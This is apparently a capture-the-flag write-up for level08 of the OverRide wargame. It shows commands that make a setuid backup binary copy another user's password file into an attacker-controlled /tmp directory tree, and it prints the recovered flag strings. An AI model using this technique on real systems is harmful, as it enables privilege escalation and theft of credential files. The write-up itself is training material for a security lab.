level08@OverRide:~$ ./level08 "../../../../home/users/level09/.pass"
ERROR: Failed to open ./backups/../../../../home/users/level09/.pass


- opens backups/.log to write logs
- opens target file to read content with av[1]
- opens target file to write flag with strncat("./backups", av[1], strlen(av[1]))

strncat 

buffer 100

"./backups" (9)

+ 

"../../../../home/users/level09/.pass" (36)

"../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/users/level09/.pass"


### Tries


We can read a `.pass` file 
```
level08@OverRide:~$ ./level08 ".pass"
level08@OverRide:~$ ls -la backups/
total 8
drwxrwx---+ 1 level09 users    80 Nov 22 18:06 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    66 Nov 22 18:08 .log
-r--r-----+ 1 level09 users    41 Nov 22 18:06 .pass
level08@OverRide:~$ cat backups/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```


1) create symlink of the level08 binary to /tmp
`ln -s /home/users/level08/level08 /tmp/level08`

```
level08@OverRide:/tmp$ ls -la
total 0
drwxrwxrwt 4 root    root    120 Nov 23 08:49 .
drwxr-xr-x 1 root    root    220 Nov 23 08:31 ..
drwxrwxrwx 3 level08 level08 100 Nov 23 08:45 backups
drwxrwxr-x 3 level08 level08  60 Nov 23 08:33 home
lrwxrwxrwx 1 level08 level08  27 Nov 23 08:48 level08 -> /home/users/level08/level08
```


2) create a symlink for the /home folder to /tmp/home
`ln -s /home /tmp/home`

This is used to bypass the error created by the forced concatenation of `./backups/` + our path `/home/users/level09/.pass`
```
level08@OverRide:/tmp$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
This symlink will help to remove the `/` preceding `home`   

3) create a fake folder tree in /tmp/backup to mimic to the behaviour of the binary backup function
```
mkdir /tmp/backups /tmp/backups/home /tmp/backups/home/users /tmp/backups/home/users/level09
```

4) run level08 binary in /tmp
```
cd /tmp
./level08
```

5) cat the flag store in our fake backup directory
```
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```